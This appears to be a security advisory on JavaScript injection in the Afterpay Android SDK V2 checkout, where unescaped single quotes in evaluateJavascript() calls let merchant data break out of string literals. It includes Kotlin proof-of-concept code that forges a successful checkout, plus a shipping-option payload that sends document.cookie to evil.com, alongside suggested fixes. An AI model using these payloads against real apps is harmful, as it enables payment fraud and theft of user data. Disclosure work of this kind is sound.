# JavaScript Injection in Afterpay Android SDK V2 Checkout via Unescaped Single Quotes in WebView evaluateJavascript()

## Summary

The Afterpay Android SDK V2 checkout flow is vulnerable to JavaScript injection due to unsafe string interpolation when passing merchant-controlled data into `WebView.evaluateJavascript()`. A malicious or compromised merchant can provide a checkout token (or shipping option data) containing a single quote character (`'`), which breaks out of the JavaScript string literal boundary and allows execution of arbitrary JavaScript code within the context of Afterpay's own domain (`static.afterpay.com`).

This enables checkout completion forgery, session hijacking, data exfiltration, and UI manipulation — all running under Afterpay's trusted origin.

## Root Cause

In `AfterpayCheckoutV2Activity.kt`, the SDK serializes merchant-provided data to JSON using `kotlinx.serialization`, then injects it into JavaScript using Kotlin string interpolation inside single-quoted JS string literals:

```kotlin
// Line 156 — Token injection
val checkoutJson = Json.encodeToString(checkout)
bootstrapWebView.evaluateJavascript("openCheckout('$checkoutJson');", null)

// Lines 336, 349 — Shipping callback injection
"postMessageToCheckout('${json.encodeToString(result)}');"
```

The JSON specification (RFC 8259) does NOT require escaping single quotes. Therefore `kotlinx.serialization` correctly preserves `'` as-is in JSON output. However, when this JSON is embedded inside a single-quoted JavaScript string, any `'` character in the data terminates the JS string literal, allowing arbitrary code after the breakout point.

## Vulnerable Source Files

- `afterpay/src/main/kotlin/com/afterpay/android/view/AfterpayCheckoutV2Activity.kt`
  - Line 156: `bootstrapWebView.evaluateJavascript("openCheckout('$checkoutJson');", null)`
  - Line 336: `"postMessageToCheckout('${json.encodeToString(result)}');"`
  - Line 349: `"postMessageToCheckout('${json.encodeToString(result)}');"`

## Affected Components

- `AfterpayCheckoutV2Activity` — Express checkout flow
- `BootstrapJavascriptInterface` — Android-to-JS bridge handling checkout messages
- Bootstrap WebView loaded with `https://static.afterpay.com/mobile-sdk/bootstrap/index.html`
- The `Android.postMessage()` JavaScript interface exposed to the WebView

## Attack Scenario

1. Attacker registers as an Afterpay merchant (or compromises an existing merchant's token endpoint).
2. A user installs the merchant's Android app, which integrates the Afterpay SDK for checkout.
3. The user initiates a V2 checkout.
4. The SDK calls the merchant's `didCommenceCheckout` handler to obtain a checkout token.
5. The merchant returns a crafted token containing: `x');Android.postMessage('{"status":"SUCCESS","orderToken":"ATTACKER_TOKEN"}');//`
6. The SDK serializes this into JSON (single quote preserved) and injects it into JavaScript via `evaluateJavascript()`.
7. The single quote breaks the JS string boundary. The injected code calls `Android.postMessage()` with a forged SUCCESS completion message.
8. The SDK's `BootstrapJavascriptInterface.postMessage()` deserializes this as a valid `AfterpayCheckoutCompletion` with status SUCCESS.
9. The activity returns `RESULT_OK` with the attacker's forged order token. The host app believes the checkout was successfully approved.

No additional user interaction is required beyond the normal checkout initiation.

## Proof of Concept

### PoC 1: Checkout Completion Forgery

Malicious merchant app implementation:

```kotlin
class MaliciousMerchantActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Afterpay.setConfiguration(
            minimumAmount = "1.00",
            maximumAmount = "1000.00",
            currencyCode = "USD",
            locale = Locale.US,
            environment = AfterpayEnvironment.SANDBOX
        )

        Afterpay.setCheckoutV2Handler(object : AfterpayCheckoutV2Handler {
            override fun didCommenceCheckout(onTokenLoaded: (Result<String>) -> Unit) {
                // Malicious token containing JS injection payload
                val maliciousToken = "x');Android.postMessage('{\"status\":\"SUCCESS\",\"orderToken\":\"FORGED_TOKEN_12345\"}');//"
                onTokenLoaded(Result.success(maliciousToken))
            }

            override fun shippingAddressDidChange(address: ShippingAddress, provide: (ShippingOptionsResult) -> Unit) {}
            override fun shippingOptionDidChange(option: ShippingOption, provide: (ShippingOptionUpdateResult?) -> Unit) {}
        })

        val intent = Afterpay.createCheckoutV2Intent(this)
        startActivityForResult(intent, 1234)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (resultCode == RESULT_OK) {
            val token = Afterpay.parseCheckoutSuccessResponse(data!!)
            // token == "FORGED_TOKEN_12345"
            // Checkout was NEVER actually approved by Afterpay!
        }
    }
}
```

### PoC 2: Data Exfiltration via Shipping Callback

```kotlin
override fun shippingAddressDidChange(
    address: ShippingAddress,
    provide: (ShippingOptionsResult) -> Unit
) {
    // Malicious shipping option name injects JS into the checkout WebView
    val maliciousOption = ShippingOption(
        id = "standard",
        name = "Standard');fetch('https://evil.com/?c='+document.cookie);//",
        description = "Normal delivery",
        shippingAmount = Money(BigDecimal("5.00"), Currency.getInstance("USD")),
        orderAmount = Money(BigDecimal("100.00"), Currency.getInstance("USD")),
        taxAmount = null
    )
    provide(ShippingOptionsSuccessResult(listOf(maliciousOption)))
}
```

### JavaScript Engine Validation (Node.js)

Both injection vectors were validated using an actual JavaScript engine:

```javascript
// Setup — mock the Afterpay bootstrap page environment
var completionReceived = null;
var Android = { postMessage: function(msg) { completionReceived = msg; } };
function openCheckout(x) { /* bootstrap page function */ }

// Execute the exact JS that evaluateJavascript would run
eval("openCheckout('{\"token\":\"x');Android.postMessage('{\"status\":\"SUCCESS\",\"orderToken\":\"HIJACKED\"}');//rest')");

console.log(completionReceived);
// Output: {"status":"SUCCESS","orderToken":"HIJACKED"}

var parsed = JSON.parse(completionReceived);
console.log(parsed.status);      // "SUCCESS"
console.log(parsed.orderToken);  // "HIJACKED"
// SDK would treat this as a successful checkout!
```

```javascript
// PoC 2 — shipping callback exfiltration
var exfilUrl = null;
function fetch(url) { exfilUrl = url; return Promise.resolve(); }
function postMessageToCheckout(x) {}

eval("postMessageToCheckout('{\"name\":\"Std');fetch('https://evil.com/?stolen=true');//rest')");

console.log(exfilUrl);
// Output: "https://evil.com/?stolen=true"
// In a real WebView, document.cookie would be appended
```

Both tests confirm arbitrary JavaScript execution.

## Security Impact

**Checkout Forgery:** A malicious merchant can forge a successful checkout completion without Afterpay ever approving the transaction. The host app receives `RESULT_OK` with an attacker-chosen order token, potentially enabling goods/services to be delivered without actual payment authorization.

**Trust Boundary Violation:** Merchants should not be able to execute arbitrary JavaScript in Afterpay's domain context. The SDK is supposed to enforce a strict boundary between merchant-provided data and Afterpay's checkout execution environment.

**Session/Cookie Theft:** Injected JavaScript runs in the `static.afterpay.com` origin. If this origin shares cookies or storage with other Afterpay services, the attacker can exfiltrate session tokens, authentication cookies, or other sensitive data.

**UI Manipulation / Phishing:** The attacker can modify the trusted Afterpay checkout DOM to display incorrect prices, inject phishing forms, or otherwise deceive the user who trusts the Afterpay-branded UI.

**Data Exfiltration:** Any data accessible within the WebView's origin (localStorage, sessionStorage, DOM content including user PII entered during checkout) can be sent to attacker-controlled servers.

## Exploitability Assessment

- **Reliability:** 100% deterministic — a single `'` character always breaks the boundary
- **User Interaction:** None beyond normal checkout initiation
- **Attacker Requirements:** Must operate a merchant app or compromise a merchant's token endpoint
- **Affected Users:** Any user who initiates V2 checkout through the compromised merchant
- **Detection Difficulty:** The injection happens silently; the user sees normal-looking checkout behavior

## Suggested Fix

Replace unsafe string interpolation with proper escaping or use a safe data-passing mechanism:

**Option 1 — Escape for JavaScript single-quote context:**

```kotlin
private fun String.escapeForJsSingleQuote(): String =
    this.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace("\n", "\\n")
        .replace("\r", "\\r")

// Fixed usage:
bootstrapWebView.evaluateJavascript(
    "openCheckout('${checkoutJson.escapeForJsSingleQuote()}');", null
)
```

**Option 2 — Use WebMessage API (API 23+):**

```kotlin
val message = WebMessage(checkoutJson)
bootstrapWebView.postWebMessage(message, Uri.parse("https://static.afterpay.com"))
```

**Option 3 — Use `encodeURIComponent` style encoding** or pass data via a global variable assignment instead of function argument interpolation.

Apply the same fix to the `postMessageToCheckout` calls at lines 336 and 349.
